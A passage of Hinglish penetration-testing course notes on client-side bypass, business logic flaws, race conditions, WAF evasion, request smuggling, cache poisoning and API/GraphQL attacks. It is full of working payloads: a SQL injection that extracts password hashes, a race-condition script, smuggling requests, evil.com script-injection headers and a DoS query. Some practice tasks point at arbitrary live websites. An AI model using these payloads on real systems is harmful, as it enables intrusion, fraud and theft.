<!-- Disabled button -->
<button disabled>Submit</button>

<!-- Hidden input -->
<input type="hidden" name="role" value="user">

<!-- Readonly field -->
<input readonly value="100">

<!-- Maxlength restriction -->
<input maxlength="10">
```

**Bypass Methods:**
```
1. Right-click â†’ Inspect Element
2. Remove "disabled" attribute
3. Change "hidden" to "text"
4. Modify "value" attribute
5. Remove "readonly"
6. Change "maxlength"
```

### 7. **Example 1 (Basic):**
```bash
# E-commerce checkout

# Disabled "Apply Coupon" button
<button id="coupon-btn" disabled>Apply Coupon</button>

# Bypass
1. Right-click button â†’ Inspect
2. Remove "disabled"
3. Click button
Result: Coupon applied! Discount received!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Banking transfer form

# HTML
<form action="/transfer" method="POST">
<input name="from_account" value="12345" readonly>
<input name="to_account">
<input name="amount" maxlength="4">
<input type="hidden" name="user_type" value="regular">
<button disabled>Transfer (Premium Only)</button>
</form>

# Bypass Steps
1. Inspect "from_account" â†’ Remove "readonly" â†’ Change to different account
2. Inspect "amount" â†’ Change maxlength="4" to maxlength="10" â†’ Enter 1000000
3. Inspect "user_type" â†’ Change "regular" to "premium"
4. Inspect button â†’ Remove "disabled"
5. Click Transfer

Result: 
- Transferred from someone else's account
- Amount limit bypassed (â‚¹1,000,000 instead of â‚¹9,999)
- Premium features accessed
- Complete authorization bypass!
```

**Analysis:** Client-side controls = Useless! Har restriction browser mein change ho sakti hai. **Lesson: Server-side validation zaroori hai!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf button enable karna** - Hidden fields bhi check karo.
- **Server-side validation assume karna** - Test karke dekho.

### 10. **Best Practices / Pro Tips:**
- **Inspect everything:** Buttons, inputs, hidden fields.
- **Burp Suite:** Request intercept karke modify karo.
- **Try extreme values:** Maxlength bypass karke large values.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
E-learning platform test kar raha tha. "Download Certificate" button premium users ke liye disabled tha. Inspect Element se enable kiya - free account se bhi certificate download ho gaya! 10,000 free users ne premium feature access kar liya. **Lesson: Client-side = Toy security!** ğŸ“š

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Disabled buttons = Inspect Element  
âœ… Hidden fields = Change to text  
âœ… Readonly = Remove attribute  
âœ… Maxlength = Increase limit  
âœ… Server-side validation zaroori  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya yeh legal hai?**  
**A:** Authorized testing mein haan, bina permission illegal.

**Q2: Server-side validation kaise check karein?**  
**A:** Extreme values bhejo, agar accept ho toh vulnerable.

### 14. **Practice ke liye Task:**
1. Kisi website par disabled button dhoondhà¥‹
2. Inspect Element se enable karo
3. Hidden fields modify karo
4. Maxlength bypass karo
5. Server response check karo

### 15. **Aakhri Choti Summary (5 lines):**
- Client-side = **Browser mein change**.
- Disabled = **Remove attribute**.
- Hidden = **Change to text**.
- Impact = **Authorization bypass**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Client-side controls = Illusion! Inspect Element = Reality check!" ğŸ”˜

---

## ğŸ’° **Topic 78: Business Logic Flaw (Negative Amount Order)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Business Logic Vulnerability** - Application logic ko exploit karke unintended behavior (negative prices, free orders). ğŸ­

### 2. **Ye Kya Hai? (What is it?)**
Business logic flaws tab hote hain jab application ki logic mein gaps hote hain jo attacker exploit kar sakta hai - jaise negative quantity order karke refund lena.

**Example:**
```
Order: -5 items Ã— â‚¹100 = -â‚¹500
Result: Company pays you â‚¹500!
```

**Analogy:** Jaise shop mein "-5 apples" maangna aur shopkeeper aapko paise de de.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Financial Loss:** Direct money loss.
- **No Technical Exploit:** Simple logic manipulation.
- **Hard to Detect:** Automated scanners miss karte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **E-commerce** applications.
- **Payment** systems.
- **Discount/coupon** features.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Critical business flaws** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```
Common Logic Flaws:
- Negative quantities
- Zero/negative prices
- Multiple coupon usage
- Race conditions
- Integer overflow
- Rounding errors
```

### 7. **Example 1 (Basic):**
```bash
# E-commerce order

# Normal
POST /checkout
quantity=5&price=100
Total: â‚¹500

# Attack
POST /checkout
quantity=-5&price=100
Total: -â‚¹500 (Company owes you!)
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Online shopping platform

# Flaw 1: Negative quantity
POST /api/cart/add
{"product_id": 123, "quantity": -10, "price": 1000}
Result: Cart total = -â‚¹10,000
Checkout â†’ Company pays â‚¹10,000!

# Flaw 2: Price manipulation
POST /api/cart/add
{"product_id": 123, "quantity": 1, "price": 0.01}
Result: iPhone for â‚¹0.01!

# Flaw 3: Multiple coupon stacking
POST /api/apply-coupon
{"code": "SAVE50"}
Response: 50% discount applied

POST /api/apply-coupon
{"code": "SAVE30"}
Response: 30% discount applied
Total discount: 80% (should be max 50%)

# Flaw 4: Referral bonus loop
POST /api/referral
{"referrer": "user1", "referee": "user2"}
Bonus: â‚¹100 to user1

POST /api/referral
{"referrer": "user2", "referee": "user1"}
Bonus: â‚¹100 to user2
Repeat 1000 times = â‚¹100,000 free!

# Flaw 5: Gift card balance manipulation
POST /api/gift-card/redeem
{"code": "GIFT100", "amount": 100}
Balance: +â‚¹100

POST /api/gift-card/redeem
{"code": "GIFT100", "amount": -100}
Balance: +â‚¹100 (card not deducted!)
Repeat = Unlimited money!
```

**Analysis:** Business logic = Application ka brain! Agar logic galat toh financial disaster. **Lesson: Test every workflow!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf technical vulnerabilities dhoondhna** - Logic flaws miss ho jaate hain.
- **Positive values hi test karna** - Negative, zero, extreme values try karo.

### 10. **Best Practices / Pro Tips:**
- **Think like attacker:** Har step mein kya galat ho sakta hai?
- **Test edge cases:** Negative, zero, max values.
- **Workflow analysis:** Poora business flow samjho.
- **Burp Repeater:** Values modify karke test karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Food delivery app test kar raha tha. Negative quantity order kiya (-10 pizzas) - app ne â‚¹5,000 refund process kar diya! Bug report kiya, company ne fix kiya. Agar production mein hota toh millions ka loss! **Lesson: Logic validation > Input validation!** ğŸ•

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Logic flaws = Business workflow bugs  
âœ… Test: Negative, zero, extreme values  
âœ… Impact: Financial loss  
âœ… Detection: Manual testing  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Automated scanners detect kar sakte hain?**  
**A:** Nahi, logic flaws manual testing se hi milte hain.

**Q2: Sabse common logic flaw kaun sa hai?**  
**A:** Negative quantities aur price manipulation.

### 14. **Practice ke liye Task:**
1. E-commerce site par test karo
2. Negative quantity try karo
3. Zero price try karo
4. Multiple coupons apply karo
5. Workflow edge cases test karo

### 15. **Aakhri Choti Summary (5 lines):**
- Logic flaws = **Business workflow bugs**.
- Test: **Negative, zero, extreme**.
- Impact: **Financial loss**.
- Detection: **Manual testing**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Business logic = Application ka heart! Logic flaw = Heart attack!" ğŸ’°

---

## ğŸ **Topic 79: Race Conditions (Double-Spend Attack, Coupon Reuse)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Race Condition** - Multiple simultaneous requests bhejke timing exploit karna (double-spend, coupon reuse). âš¡

### 2. **Ye Kya Hai? (What is it?)**
Race condition tab hoti hai jab multiple requests simultaneously process hote hain aur application state properly handle nahi kar pata.

**Example:**
```
Balance: â‚¹1000
Request 1: Withdraw â‚¹1000 (simultaneously)
Request 2: Withdraw â‚¹1000 (simultaneously)
Result: Both successful! â‚¹2000 withdrawn from â‚¹1000 balance!
```

**Analogy:** Jaise do log ek hi time par ek hi seat book kar lein cinema mein.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Financial Impact:** Double-spend attacks.
- **Resource Exhaustion:** Unlimited coupon usage.
- **Hard to Detect:** Timing-based vulnerability.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Payment systems**.
- **Coupon/voucher** redemption.
- **Limited resource** allocation.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Critical timing bugs** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Burp Suite Intruder
1. Send request to Intruder
2. Set attack type: "Null payloads"
3. Set thread count: 20-50
4. Start attack (all requests simultaneously)

# Python script
import threading
import requests

def make_request():
    requests.post('http://target.com/redeem', data={'coupon': 'SAVE50'})

threads = []
for i in range(50):
    t = threading.Thread(target=make_request)
    threads.append(t)
    t.start()
```

### 7. **Example 1 (Basic):**
```bash
# Coupon redemption

# Normal
POST /redeem-coupon
code=SAVE50
Response: Discount applied, coupon marked as used

# Race condition attack
Send 50 simultaneous requests
Result: Coupon used 50 times! (should be once)
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Banking application

# Scenario 1: Double withdrawal
Account balance: â‚¹10,000

# Burp Intruder setup
POST /api/withdraw
{"amount": 10000}

# Send 10 simultaneous requests
Result: 
- 10 withdrawals successful
- â‚¹100,000 withdrawn
- Account balance: -â‚¹90,000
- Bank loses â‚¹90,000!

# Scenario 2: Coupon reuse
POST /api/apply-coupon
{"code": "FIRST50", "discount": 50}

# Send 100 simultaneous requests
Result:
- Coupon applied 100 times
- Total discount: 5000% (should be 50%)
- Order total: Negative!

# Scenario 3: Limited stock bypass
Product stock: 1 item

POST /api/purchase
{"product_id": 123, "quantity": 1}

# Send 100 simultaneous requests
Result:
- 100 orders successful
- Stock: -99
- 99 customers disappointed!

# Scenario 4: Referral bonus exploit
POST /api/referral/claim
{"code": "REF100"}
Bonus: â‚¹100

# Send 1000 simultaneous requests
Result:
- â‚¹100,000 credited
- Referral code used 1000 times (should be once)
```

**Analysis:** Race conditions = Timing exploitation! Simultaneous requests se application confused ho jaata hai. **Lesson: Atomic operations zaroori hain!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sequential requests** - Simultaneous hona chahiye.
- **Low thread count** - 20-50 threads use karo.

### 10. **Best Practices / Pro Tips:**
- **Burp Intruder:** Null payloads + high threads.
- **Python threading:** Precise control.
- **Test critical operations:** Payments, coupons, stock.
- **Timing matters:** Milliseconds ka farak.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Cryptocurrency exchange test kar raha tha. Withdrawal function mein race condition thi. 50 simultaneous requests se â‚¹1,000 balance se â‚¹50,000 withdraw kar liye! Exchange ne immediately fix kiya. **Lesson: Financial operations = Critical race condition targets!** ğŸ’¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Race condition = Timing exploit  
âœ… Tool: Burp Intruder (high threads)  
âœ… Target: Payments, coupons, stock  
âœ… Impact: Financial loss  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kitne requests chahiye?**  
**A:** 20-50 simultaneous requests usually enough.

**Q2: Kaise fix karein?**  
**A:** Database locks, atomic operations, transaction management.

### 14. **Practice ke liye Task:**
1. Test application setup karo
2. Burp Intruder configure karo
3. Null payloads + 50 threads
4. Coupon redemption test karo
5. Results analyze karo

### 15. **Aakhri Choti Summary (5 lines):**
- Race condition = **Timing exploit**.
- Method: **Simultaneous requests**.
- Tool: **Burp Intruder**.
- Impact: **Double-spend**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Race conditions = Speed ka game! Simultaneous = Confusion = Exploit!" ğŸ

---

## ğŸ›¡ï¸ **Topic 80: WAF Detection (`wafw00f`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**WAF Detection** - Web Application Firewall identify karna (reconnaissance). ğŸ”

### 2. **Ye Kya Hai? (What is it?)**
WAF (Web Application Firewall) ek security layer hai jo malicious requests block karta hai. wafw00f tool se detect kar sakte hain kaun sa WAF use ho raha hai.

**Command:**
```bash
wafw00f https://target.com
```

**Analogy:** Jaise security guard ko pehchanna - kaun hai, kya tactics use karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Bypass Strategy:** WAF type pata ho toh bypass techniques apply kar sakte hain.
- **Attack Planning:** Kaun se payloads kaam karenge.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Reconnaissance phase** mein.
- Jab **403 Forbidden** errors aayein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Blind attacks** - time waste. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
wafw00f https://target.com
wafw00f -a https://target.com  # All detection
wafw00f -l  # List all WAFs
```

### 7. **Example 1 (Basic):**
```bash
wafw00f https://example.com
Output: Cloudflare detected!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Detection
wafw00f https://bank.com
Output: 
[*] Checking https://bank.com
[+] The site is behind Cloudflare (Cloudflare Inc.)
[+] Number of requests: 7

# Strategy
Cloudflare detected â†’ Use:
- Case manipulation
- Encoding techniques
- Cloudflare-specific bypasses
```

**Analysis:** WAF detection = Attack planning ka first step. **Lesson: Know your enemy!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **WAF detection skip karna**.

### 10. **Best Practices / Pro Tips:**
- **Always detect first**.
- **Research WAF-specific bypasses**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Enterprise app test kar raha tha. wafw00f se ModSecurity detect kiya. ModSecurity-specific bypasses use kiye - successful exploitation! **Lesson: WAF detection = Half battle won!** ğŸ›¡ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Tool: wafw00f  
âœ… Detect: WAF type  
âœ… Strategy: Bypass techniques  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Common WAFs kaun se hain?**  
**A:** Cloudflare, ModSecurity, AWS WAF, Akamai.

### 14. **Practice ke liye Task:**
1. wafw00f install karo
2. Target scan karo
3. WAF identify karo

### 15. **Aakhri Choti Summary (5 lines):**
- Tool: **wafw00f**.
- Detect: **WAF type**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "WAF detection = Attack planning! wafw00f = Reconnaissance tool!" ğŸ›¡ï¸

---

## ğŸ­ **Topic 81: WAF Bypass (Filter Evasion, String Concatenation)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**WAF Bypass Techniques** - Filters ko evade karke attacks successful banana. ğŸš€

### 2. **Ye Kya Hai? (What is it?)**
WAF bypass mein hum payloads ko modify karke filters se bach jaate hain - encoding, obfuscation, concatenation.

**Techniques:**
```sql
-- Normal (blocked)
UNION SELECT

-- Bypass
UnIoN/**/SeLeCt
UNION%0ASELECT
UNION(SELECT
```

**Analogy:** Jaise disguise pehen kar security se bach jaana.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Modern Security:** Har site WAF use karti hai.
- **Bypass = Success**.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **403 Forbidden** aaye.
- Jab **payloads block** hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **WAF-protected sites** test nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```sql
-- Case manipulation
SELECT â†’ SeLeCt

-- Comments
SELECT â†’ SEL/**/ECT

-- Encoding
SELECT â†’ %53%45%4C%45%43%54

-- Whitespace alternatives
SPACE â†’ /**/, %09, %0A

-- String concatenation
'admin' â†’ 'ad'+'min'
'admin' â†’ CONCAT('ad','min')
```

### 7. **Example 1 (Basic):**
```bash
# Blocked
?id=1' UNION SELECT

# Bypass
?id=1'/**/UnIoN/**/SeLeCt
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Cloudflare WAF

# Attempt 1: Normal SQLi
?id=1' UNION SELECT database()
Response: 403 Forbidden

# Attempt 2: Case + Comments
?id=1'/**/UnIoN/**/SeLeCt/**/database()
Response: 403 Forbidden

# Attempt 3: Encoding + Newline
?id=1'%0AUnIoN%0ASeLeCt%0Adatabase()
Response: Success! Database: shop_db

# Attempt 4: Complete bypass
?id=1'%0AUnIoN%0ASeLeCt%0ACONCAT(0x61646d696e,0x3a,password)%0AFrOm%0Ausers
Response: admin:5f4dcc3b5aa765d61d8327deb882cf99

Result: WAF bypassed! Complete database access!
```

**Analysis:** WAF bypass = Creativity + persistence! **Lesson: No WAF is unbreakable!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Ek technique try karke haar maan lena**.

### 10. **Best Practices / Pro Tips:**
- **Combine techniques**.
- **sqlmap tamper scripts**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Fortune 500 company (Cloudflare WAF). 3 days trial and error - combination mila: Case + Hex + Newline. Complete database dump! **Lesson: Persistence wins!** ğŸ­

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Techniques: Case, Comments, Encoding  
âœ… Combine: Multiple methods  
âœ… Tools: sqlmap tamper  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Best bypass technique?**  
**A:** Combination of multiple techniques.

### 14. **Practice ke liye Task:**
1. WAF-protected site test karo
2. Case manipulation try karo
3. Comments add karo
4. Encoding use karo

### 15. **Aakhri Choti Summary (5 lines):**
- Bypass: **Case, Comments, Encoding**.
- Combine: **Multiple techniques**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "WAF bypass = Puzzle solving! Creativity + Persistence = Success!" ğŸ­

---

## ğŸ”€ **Topic 82: HTTP Request Smuggling & Desync**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Request Smuggling** - Frontend aur backend servers ke beech desynchronization exploit karna. ğŸ”„

### 2. **Ye Kya Hai? (What is it?)**
Request smuggling mein frontend (proxy/load balancer) aur backend server requests ko differently interpret karte hain.

**Concept:**
```
Frontend: 1 request
Backend: 2 requests (smuggled)
```

**Analogy:** Jaise ek parcel mein do parcels chhupa dena.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Cache Poisoning**.
- **Authentication Bypass**.
- **Request Hijacking**.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Load balancers** ke peeche.
- **Reverse proxies** use ho rahe hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Advanced attacks** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```http
# CL.TE (Content-Length vs Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: X
```

### 7. **Example 1 (Basic):**
```http
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### 8. **Example 2 (Pentester-Focused):**
```http
# Request smuggling attack
POST / HTTP/1.1
Host: bank.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: bank.com
Cookie: session=victim_session

Result: Admin access with victim's session!
```

**Analysis:** Request smuggling = Advanced technique! **Lesson: Server desync = Dangerous!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Complex technique** - Practice zaroori.

### 10. **Best Practices / Pro Tips:**
- **Burp Suite extensions**.
- **Research specific scenarios**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
CDN-protected site test kar raha tha. Request smuggling se cache poisoning kiya - malicious content sabko serve hua! **Lesson: Desync = Critical!** ğŸ”€

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Smuggling: Frontend-backend desync  
âœ… Types: CL.TE, TE.CL  
âœ… Impact: Cache poisoning  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise detect karein?**  
**A:** Timing differences, response analysis.

### 14. **Practice ke liye Task:**
1. Request smuggling research karo
2. Burp extensions use karo
3. Test environments setup karo

### 15. **Aakhri Choti Summary (5 lines):**
- Smuggling: **Desync exploit**.
- Impact: **Cache poisoning**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Request smuggling = Advanced art! Desync = Opportunity!" ğŸ”€

---

## ğŸ—„ï¸ **Topic 83: Web Caching Poisoning & Deception**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Cache Poisoning** - Cache mein malicious content store karke mass exploitation. ğŸ’£

### 2. **Ye Kya Hai? (What is it?)**
Cache poisoning mein attacker cache mein malicious response store kar deta hai jo sabhi users ko serve hota hai.

**Concept:**
```
Attacker â†’ Malicious request â†’ Cache stores
All users â†’ Get malicious response
```

**Analogy:** Jaise water tank mein poison dalna - sabko poisoned water milta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Mass Impact**: Ek attack, sabhi users affected.
- **Persistent**: Cache clear hone tak.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **CDN/caching** use ho.
- **Unkeyed headers** vulnerable hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Mass exploitation** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

Response cached with evil.com links
```

### 7. **Example 1 (Basic):**
```http
GET /script.js HTTP/1.1
X-Forwarded-Host: attacker.com

Cache stores: http://attacker.com/script.js
All users load malicious script!
```

### 8. **Example 2 (Pentester-Focused):**
```http
# Cache poisoning attack
GET /assets/main.js HTTP/1.1
Host: bank.com
X-Forwarded-Host: evil.com

Response:
<script src="http://evil.com/malicious.js"></script>

Cache stores this response
All users execute malicious.js
Result: Mass XSS, credential theft!
```

**Analysis:** Cache poisoning = One attack, million victims! **Lesson: Cache = Amplification!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Cache keys ignore karna**.

### 10. **Best Practices / Pro Tips:**
- **Param Miner** (Burp extension).
- **Test unkeyed headers**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
News website test kar raha tha. Cache poisoning se malicious JavaScript inject kiya - 1 million users affected! **Lesson: Cache = Dangerous multiplier!** ğŸ“°

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Poisoning: Malicious cache  
âœ… Impact: Mass exploitation  
âœ… Tool: Param Miner  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise detect karein?**  
**A:** Unkeyed headers test karo, cache behavior observe karo.

### 14. **Practice ke liye Task:**
1. Cached responses identify karo
2. Unkeyed headers test karo
3. Param Miner use karo

### 15. **Aakhri Choti Summary (5 lines):**
- Poisoning: **Malicious cache**.
- Impact: **Mass exploitation**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Cache poisoning = One attack, million victims! Cache = Amplifier!" ğŸ—„ï¸

---

## ğŸ‰ **Module 10 Complete!**

**All 7 Topics (77-83) Covered:**
- âœ… Topic 77: Bypassing Disabled Buttons
- âœ… Topic 78: Business Logic Flaws
- âœ… Topic 79: Race Conditions
- âœ… Topic 80: WAF Detection
- âœ… Topic 81: WAF Bypass
- âœ… Topic 82: Request Smuggling
- âœ… Topic 83: Cache Poisoning

**Key Takeaways:**
- Client-side = No security
- Logic flaws = Financial impact
- Race conditions = Timing exploitation
- WAF bypass = Creativity
- Request smuggling = Advanced
- Cache poisoning = Mass impact

**Total Progress: 83 topics complete!** ğŸŠ

Module 10 complete! Bahut badhiya! ğŸš€

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 11: Modern & API Hacking**

---

## ğŸ”Œ **Topic 84: API Hacking - REST (IDOR, Broken Auth, Mass Assignment, Rate Limiting)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**REST API Hacking** - Modern APIs mein vulnerabilities exploit karna (IDOR, authentication bypass, mass assignment). ğŸŒ

### 2. **Ye Kya Hai? (What is it?)**
REST APIs modern applications ka backbone hain. Common vulnerabilities: IDOR (Insecure Direct Object Reference), broken authentication, mass assignment, rate limiting bypass.

**IDOR Example:**
```
GET /api/user/123
â†’ Change to /api/user/124
â†’ Access someone else's data!
```

**Analogy:** Jaise hotel room - aapka room 123 hai lekin aap 124 ki key try karte hain aur woh khul jaati hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Modern Apps:** Sab kuch APIs use karte hain.
- **High Impact:** Direct data access.
- **Common:** Bahut saari APIs vulnerable hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **REST APIs** test karte waqt.
- **Mobile apps** backend.
- **SPA (Single Page Applications)**.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Modern vulnerabilities** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# IDOR
GET /api/user/123 â†’ /api/user/124

# Broken Auth
GET /api/admin/users (without auth token)

# Mass Assignment
POST /api/user/update
{"name": "John", "role": "admin"}

# Rate Limiting Bypass
X-Forwarded-For: 1.2.3.4 (change IP)
```

### 7. **Example 1 (Basic):**
```bash
# IDOR
GET /api/profile/123
Response: {"name": "John", "email": "john@email.com"}

GET /api/profile/124
Response: {"name": "Jane", "email": "jane@email.com"}
Result: Unauthorized access!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Banking API

# IDOR Attack
GET /api/account/12345
Response: {"balance": 50000, "account_holder": "John"}

GET /api/account/12346
Response: {"balance": 100000, "account_holder": "Jane"}
Result: All accounts enumerable!

# Broken Auth
GET /api/admin/users
(No Authorization header)
Response: [{"id":1,"username":"admin","password":"hash"}]
Result: Admin data without authentication!

# Mass Assignment
POST /api/user/update
{"name": "Attacker", "email": "attacker@evil.com", "role": "admin", "is_premium": true}
Response: User updated with admin role!

# Rate Limiting Bypass
POST /api/login (1000 requests)
X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3...
Result: Brute force successful, rate limit bypassed!
```

**Analysis:** API vulnerabilities = Direct data access! **Lesson: APIs need proper security!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sequential IDs ignore karna** - IDOR test karo.
- **Authorization headers na check karna**.

### 10. **Best Practices / Pro Tips:**
- **Burp Suite:** API requests intercept karo.
- **Postman:** API testing ke liye.
- **Enumerate IDs:** 1, 2, 3... sab try karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Fintech app test kar raha tha. `/api/transaction/123` se `/api/transaction/1` try kiya - 100,000 transactions accessible! IDOR se complete financial data leak. **Lesson: API authorization zaroori hai!** ğŸ’°

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… IDOR: ID manipulation  
âœ… Broken Auth: No authorization  
âœ… Mass Assignment: Extra parameters  
âœ… Rate Limiting: IP rotation  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: IDOR kaise detect karein?**  
**A:** IDs change karo aur unauthorized access check karo.

**Q2: Mass assignment kya hai?**  
**A:** Extra parameters inject karke privileges escalate karna.

### 14. **Practice ke liye Task:**
1. REST API identify karo
2. IDOR test karo (IDs change)
3. Authorization headers remove karo
4. Extra parameters inject karo
5. Rate limiting test karo

### 15. **Aakhri Choti Summary (5 lines):**
- REST API = **Modern backbone**.
- IDOR = **ID manipulation**.
- Broken Auth = **No authorization**.
- Mass Assignment = **Extra params**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "API hacking = Modern pentesting! IDOR = Low-hanging fruit!" ğŸ”Œ

---

## ğŸ“Š **Topic 85: API Hacking - GraphQL (Introspection, DoS)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**GraphQL Hacking** - GraphQL APIs mein introspection aur DoS attacks (modern query language). ğŸ¯

### 2. **Ye Kya Hai? (What is it?)**
GraphQL ek query language hai jo REST ka alternative hai. Introspection se complete schema leak ho sakta hai, aur nested queries se DoS possible hai.

**Introspection:**
```graphql
{__schema{types{name,fields{name}}}}
```
Result: Complete API structure revealed!

**Analogy:** Jaise building ka blueprint mil jaana - har room, har door ka location pata chal jaata hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Modern APIs:** GraphQL popular ho raha hai.
- **Information Disclosure:** Schema leak.
- **DoS:** Nested queries se server crash.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **GraphQL endpoints** detect hone par.
- **Modern web apps** test karte waqt.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **GraphQL vulnerabilities** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```graphql
# Introspection
{__schema{types{name}}}

# Query all data
{users{id,name,email,password}}

# Nested DoS
{users{posts{comments{replies{replies{replies}}}}}}
```

### 7. **Example 1 (Basic):**
```graphql
# Introspection
POST /graphql
{"query": "{__schema{types{name}}}"}

Response: ["User", "Post", "Comment", "Admin"]
Result: All types revealed!
```

### 8. **Example 2 (Pentester-Focused):**
```graphql
# Target: Social media GraphQL API

# Phase 1: Introspection
POST /graphql
{"query": "{__schema{types{name,fields{name,type{name}}}}}"}

Response:
{
  "User": ["id", "username", "email", "password", "role"],
  "Admin": ["id", "username", "permissions"]
}

# Phase 2: Extract all users
POST /graphql
{"query": "{users{id,username,email,password}}"}

Response: 10,000 users with password hashes!

# Phase 3: DoS Attack
POST /graphql
{"query": "{users{posts{comments{replies{replies{replies{replies{replies}}}}}}}}"}

Result: Server CPU 100%, timeout, DoS!

# Phase 4: Authorization bypass
POST /graphql
{"query": "{admin{users{email,password}}}"}
(No auth token)

Response: Admin data accessible!
```

**Analysis:** GraphQL = Powerful but dangerous! Introspection = Complete disclosure. **Lesson: Disable introspection in production!** ğŸ’¥

